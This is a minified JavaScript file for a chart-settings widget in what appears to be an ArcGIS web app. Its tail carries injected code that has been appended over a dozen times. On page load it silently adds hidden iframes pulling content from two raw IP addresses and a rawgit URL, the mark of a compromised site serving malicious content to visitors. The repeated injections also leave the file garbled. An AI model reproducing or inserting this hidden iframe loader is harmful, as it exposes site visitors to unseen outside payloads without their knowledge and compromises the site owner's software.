(a.showLegend=!1);a.legendTextColor||(a.legendTextColor=c);a.legendTextSize||(a.legendTextSize=12);"undefined"===typeof a.showDataLabel&&(a.showDataLabel=!1);a.dataLabelColor||(a.dataLabelColor=c);a.dataLabelSize||(a.dataLabelSize=12);"undefined"===typeof a.showHorizontalAxis&&(a.showHorizontalAxis=!0);a.horizontalAxisTextColor||(a.horizontalAxisTextColor=c);a.horizontalAxisTextSize||(a.horizontalAxisTextSize=12);"undefined"===typeof a.showVerticalAxis&&(a.showVerticalAxis=!0);a.verticalAxisTextColor||
(a.verticalAxisTextColor=c);a.verticalAxisTextSize||(a.verticalAxisTextSize=12);"undefined"===typeof a.seriesStyle&&(a.seriesStyle={styles:[]});return d.clone(a)},_updateSortFields:function(a){var b=a.config.mode,c=this._getSortFields(a),d={};d.mode=b;d.fieldOption=c;a.computed.sortComputed=d;return c},_getSortFields:function(a){if(a){var b=a.computed.definition,c=a.config,h=c.mode;if(b&&c&&("feature"===h||c.valueFields&&c.valueFields[0])){var e=[];"feature"===h?e=d.clone(b.fields):c.valueFields&&
(e=this._getFieldInfosByFieldName(c.valueFields,a.computed.definition));return e.map(function(a){return{value:a.name,label:a.alias||a.name}})}}},_getFieldInfosByFieldName:function(a,b){return a.map(function(a){a=this._getFieldInfo(a,b);return d.clone(a)}.bind(this))},_getFieldAlias:function(a,b){a=this._getFieldInfo(a,b);return a.alias||a.name},_updateModesByDefinition:function(a){var b=!1,c=["feature","category","count","field"],h=a.computed.definition,e=a.dataSource;e.frameWorkDsId&&(e=(this.appConfig.dataSource&&
this.appConfig.dataSource.dataSources)[e.frameWorkDsId],"FeatureStatistics"===e.type&&(b=!0,c=0<(d.clone(e.dataSchema).groupByFields||[]).length?["category","count"]:["field"]));b||this._hasNumberFields(h)||(c=["field"]);a.computed.modes=c;-1===c.indexOf(a.config.mode)&&(a.config.mode=c[0],this._updateUIByMode())},_hasNumberFields:function(a){var b=!1;(a=a.fields)&&0<a.length&&(b=m.some(a,d.hitch(this,function(a){return 0<=this._numberFieldTypes.indexOf(a.type)})));return b},_isDateField:function(a,
b){return(a=this._getFieldInfo(a,b))?"esriFieldTypeDate"===a.type:!1},_getFieldInfo:function(a,b){var c=null;b=b.fields;for(var d=0;d<b.length;d++)b[d].name===a&&(c=b[d]);return c},_shouldShowDateOption:function(a){var b=this._isDateField(a.config.categoryField,a.computed.definition);a=a.config.mode;return("category"===a||"count"===a)&&b},_getLayerDefinitionByDataSource:function(a){var b=a.dataSource,c=new v;b.layerId?(a=this.layerInfosObj.getLayerInfoById(b.layerId))&&this._getServiceDefinitionByLayerInfo(a).then(function(a){this._addAliasForLayerDefinition(a);
c.resolve(a)}.bind(this)):b.frameWorkDsId&&(a=null,b=(this.appConfig.dataSource&&this.appConfig.dataSource.dataSources)[b.frameWorkDsId],"Features"===b.type?(a=d.clone(b.dataSchema),this._addAliasForLayerDefinition(a),c.resolve(a)):"FeatureStatistics"===b.type&&(a={type:"Table",fields:[]},b=d.clone(b.dataSchema),a.fields=b.fields,b.groupByFields&&b.groupByFields[0]&&(a.groupByFields=d.clone(b.groupByFields)),this._addAliasForLayerDefinition(a),c.resolve(a)));return c},_getServiceDefinitionByLayerInfo:function(a){return a.getServiceDefinition().then(d.hitch(this,
function(b){return b?b:a.getLayerObject().then(d.hitch(this,function(a){return a?u.getFeatureLayerDefinition(a):null}))}))},_shouldShowUseLayerSymbolDisplay:function(a){var b=a.computed.definition,c=!1,d=a.config.mode;if("line"===a.config.type||"field"===d)return c;var e,f=null,g=null;a.dataSource&&(g=a.dataSource,g.layerId?e=g.layerId:g.frameWorkDsId&&(g=this.dataSourceManager.parseDataSourceId(g.frameWorkDsId))&&"undefined"!==g.layerId&&(e=g.layerId));e&&(f=this._getFeatureLayer(e));if(!e)return c;
if("feature"===d)c=!0;else if("category"===d||"count"===d){a=a.config.categoryField;if(!f)return c;f.renderer&&(f=f.renderer,"esri.renderer.ClassBreaksRenderer"===f.declaredClass||"esri.renderer.UniqueValueRenderer"===f.declaredClass)&&(f.attributeField!==a||this._isDateField(a,b)||(c=!0))}return c},_getFeatureLayer:function(a){var b=null;this.map&&"undefined"!==typeof a&&(b=this.map.getLayer(a));return b},_showDataOption:function(a){"pie"!==a&&this._showPeriodsRecordsDiv();this._showPeridoDiv()},
_hideDataOption:function(){this._hidePeridoDiv();this._hidePeriodsRecordsDiv()},_showPeridoDiv:function(){f.setStyle(this.periodDiv,"display","")},_hidePeridoDiv:function(){f.setStyle(this.periodDiv,"display","none")},_showPeriodsRecordsDiv:function(){f.setStyle(this.periodsRecordsDiv,"display","")},_hidePeriodsRecordsDiv:function(){f.setStyle(this.periodsRecordsDiv,"display","none")},_hideLegend:function(){this.legendTogglePocket&&this.legendTogglePocket.hide()},_showLegend:function(){this.legendTogglePocket&&
this.legendTogglePocket.show()},_initChartMode:function(a){this.chartModeSelect.removeOption(this.chartModeSelect.getOptions());a.forEach(function(a){"feature"===a?this.chartModeSelect.addOption({value:"feature",label:this.nls.featureOption}):"category"===a?this.chartModeSelect.addOption({value:"category",label:this.nls.categoryOption}):"count"===a?this.chartModeSelect.addOption({value:"count",label:this.nls.countOption}):"field"===a&&this.chartModeSelect.addOption({value:"field",label:this.nls.fieldOption})}.bind(this))},
_initDom:function(){this.tabContainer=new C({average:!0,tabs:[{title:this.nls.data,content:this.dataSection},{title:this.nls.display,content:this.displaySection}]});this.seriesStyleDijit=new F({nls:this.nls,modle:this._getSeriesStyleInitModle(this.modle)});this.seriesStyleDijit.placeAt(this.chartColorContainer);this.seriesStyleDijit.startup();this.own(k(this.seriesStyleDijit,"change",d.hitch(this,this._onSeriesStyleDijitChanged)));this._initChartMode(["feature","category","count","field"]);this.hollowSizeControl=
new p({min:0,max:60,step:1,value:this.config.innerRadius||0});this.own(k(this.hollowSizeControl,"change",d.hitch(this,this._onHollowSizeControlChanged)));this.hollowSizeControl.placeAt(this.hollowSize);this.legendTextSizeControl=new p({min:6,max:40,step:1,value:this.config.legendTextSize||12});this.own(k(this.legendTextSizeControl,"change",d.hitch(this,this._onLegendTextSizeChanged)));this.legendTextSizeControl.placeAt(this.legendTextSize);this.verticalAxisTextSizeControl=new p({min:6,max:40,step:1,
value:this.config.verticalAxisTextSize||12});this.own(k(this.verticalAxisTextSizeControl,"change",d.hitch(this,this._onVerticalAxisTextSizeChanged)));this.verticalAxisTextSizeControl.placeAt(this.verTextSize);this.horizontalAxisTextSizeControl=new p({min:6,max:40,step:1,value:this.config.horizontalAxisTextSize||12});this.own(k(this.horizontalAxisTextSizeControl,"change",d.hitch(this,this._onHorizontalAxisTextSizeChanged)));this.horizontalAxisTextSizeControl.placeAt(this.horTextSize);this.dataLabelSizeControl=
new p({min:6,max:40,step:1,value:this.config.dataLabelSize||12});this.own(k(this.dataLabelSizeControl,"change",d.hitch(this,this._onDataLabelSizeChanged)));this.dataLabelSizeControl.placeAt(this.dataLabelTextSize);this.legendTogglePocket=new r({titleLabel:this.nls.legend,content:this.legendTogglePocketContent,className:"section-item column-type bar-type line-type pie-type"});this.own(k(this.legendTogglePocket,"change",d.hitch(this,this._onLegendTogglePocketChanged)));this.legendTogglePocket.placeAt(this.displaySection);
this.horTogglePocket=new r({titleLabel:this.nls.horizontalAxis,content:this.horTogglePocketContent,className:"section-item column-type bar-type line-type"});this.own(k(this.horTogglePocket,"change",d.hitch(this,this._onHorTogglePocketChanged)));this.horTogglePocket.placeAt(this.displaySection);this.verTogglePocket=new r({titleLabel:this.nls.verticalAxis,content:this.verTogglePocketContent,className:"section-item column-type bar-type line-type"});this.own(k(this.verTogglePocket,"change",d.hitch(this,
this._onVerTogglePocketChanged)));this.verTogglePocket.placeAt(this.displaySection);this.dataLabelTogglePocket=new r({titleLabel:this.nls.dataLabels,content:this.dataLabelTogglePocketContent,className:"section-item pie-type"});this.own(k(this.dataLabelTogglePocket,"change",d.hitch(this,this._onDataLabelsTogglePocketChanged)));this.dataLabelTogglePocket.placeAt(this.displaySection);this.chartSortDijit=new D({nls:this.nls});this.own(k(this.chartSortDijit,"change",d.hitch(this,this._onChartSortDijitChanged)));
this.chartSortDijit.placeAt(this.chartSort);this.tabContainer.placeAt(this.domNode);this.maxLabels=new E({intermediateChanges:!0});"pie"===this.modle.config.type?(this.maxLabels.constraints={min:1,max:100},this.maxLabels.set("value",100),this.maxLabels.required=!0):(this.maxLabels.constraints={min:1,max:3E3},this.maxLabels.required=!1);this.own(k(this.maxLabels,"change",function(){this._onMaxLabelsChanged()}.bind(this)));this.maxLabels.placeAt(this.maxLabelsDiv);this._reset()},_addAliasForLayerDefinition:function(a){a&&
a.fields&&0<a.fields.length&&m.forEach(a.fields,d.hitch(this,function(a){a.name&&!a.alias&&(a.alias=a.name)}))},_updateElementDisplayByChartMode:function(a){var b=a.config.mode+"-mode";a=t(".section-item",this.dataSection);m.forEach(a,d.hitch(this,function(a){f.hasClass(a,b)?this._showSectionItem(a):this._hideSectionItem(a)}))},_updateElementDisplayByChartType:function(a){var b=a+"-type";a=t(".section-item",this.displaySection);m.forEach(a,d.hitch(this,function(a){f.hasClass(a,b)?this._showSectionItem(a):
this._hideSectionItem(a)}))},_showSectionItem:function(a){f.removeClass(a,"hide")},_hideSectionItem:function(a){f.addClass(a,"hide")},_showSplitedContainer:function(){f.removeClass(this.splitFieldContainer,"hide")},_hideSplitedContainer:function(){f.addClass(this.splitFieldContainer,"hide")},_showChartNoData:function(){setTimeout(function(){this.dijit.showNoData()}.bind(this),200)},_isEqual:function(a,b){return typeof a!==typeof b?!1:"object"!==typeof a?a===b:u.isEqual(a,b)},_isDSEqual:function(a,
b){if(a&&b)return a=this._cloneAndFormatDS(a),b=this._cloneAndFormatDS(b),this._isEqual(a,b)},_cloneAndFormatDS:function(a){a=d.clone(a);var b={};a.name&&(b.name=a.name);a.dataSourceType&&(b.dataSourceType=a.dataSourceType);a.layerId&&(b.layerId=a.layerId);a.frameWorkDsId&&(b.frameWorkDsId=a.frameWorkDsId);return b},_updateOptions:function(a,b,c){b?(a.removeOption(a.getOptions()),a.addOption(b)):b=[];!c&&0<b.length&&(c=b[0].value);c&&a.set("value",c)},_onChartModeChanged:function(a){this.ignoreChangeEvents||
(this.PRE_MODLE=d.clone(this.modle),this.modle.config.mode=a,this.render(this.modle))},_onLabelFieldChanged:function(a){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.labelField=a,this.render(this.modle))},_onCategoryFieldChanged:function(a){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.categoryField=a,this.render(this.modle))},_onMinPeriodChanged:function(a){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.dateConfig.minPeriod=
a,this.render(this.modle))},_onPeriodsWithOutRecords:function(a){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.dateConfig.isNeedFilled=a,this.render(this.modle))},_onOperationSelectChanged:function(a){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.operation=a,this.render(this.modle))},_onNullValueAsZeroChange:function(a){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.nullValue=a,this.render(this.modle))},
_onValueFieldsChanged:function(){if(!this.ignoreChangeEvents){this.PRE_MODLE=d.clone(this.modle);var a=this.valueFields.getSelectedFieldNames();this.modle.config.valueFields=a;this.render(this.modle)}},_onSplitFieldsChanged:function(a){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.splitField=a,this.render(this.modle))},_onChartSortDijitChanged:function(a){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.sortOrder=a,this.render(this.modle))},
_onMaxLabelsChanged:function(){if(!this.ignoreChangeEvents){this.PRE_MODLE=d.clone(this.modle);var a=this.maxLabels.get("value");this.modle.config.maxLabels=a;this.render(this.modle)}},_onBgColorChanged:function(){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.backgroundColor=this.bgColor.getSingleColor(),this.render(this.modle))},_onLegendTogglePocketChanged:function(){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.showLegend=this.legendTogglePocket.getState(),
this.render(this.modle))},_onLegendTextColorChanged:function(){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.legendTextColor=this.legendTextColor.getSingleColor(),this.render(this.modle))},_onHorTogglePocketChanged:function(){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.showHorizontalAxis=this.horTogglePocket.getState(),this.render(this.modle))},_onHorColorChanged:function(){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),
this.modle.config.horizontalAxisTextColor=this.horTextColor.getSingleColor(),this.render(this.modle))},_onVerTogglePocketChanged:function(){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.showVerticalAxis=this.verTogglePocket.getState(),this.render(this.modle))},_onVerColorChanged:function(){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.verticalAxisTextColor=this.verTextColor.getSingleColor(),this.render(this.modle))},_onDataLabelsTogglePocketChanged:function(){this.ignoreChangeEvents||
(this.PRE_MODLE=d.clone(this.modle),this.modle.config.showDataLabel=this.dataLabelTogglePocket.getState(),this.render(this.modle))},_onDataLabelColorChanged:function(){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.dataLabelColor=this.dataLabelTextColor.getSingleColor(),this.render(this.modle))},_onHollowSizeControlChanged:function(a){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.innerRadius=a,this.render(this.modle))},_onLegendTextSizeChanged:function(a){this.ignoreChangeEvents||
(this.PRE_MODLE=d.clone(this.modle),this.modle.config.legendTextSize=a,this.render(this.modle))},_onVerticalAxisTextSizeChanged:function(a){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.verticalAxisTextSize=a,this.render(this.modle))},_onHorizontalAxisTextSizeChanged:function(a){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.horizontalAxisTextSize=a,this.render(this.modle))},_onDataLabelSizeChanged:function(a){this.ignoreChangeEvents||
(this.PRE_MODLE=d.clone(this.modle),this.modle.config.dataLabelSize=a,this.render(this.modle))},_onSeriesStyleDijitChanged:function(a){this.ignoreChangeEvents||(this.PRE_MODLE=d.clone(this.modle),this.modle.config.seriesStyle=a,this.render(this.modle))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});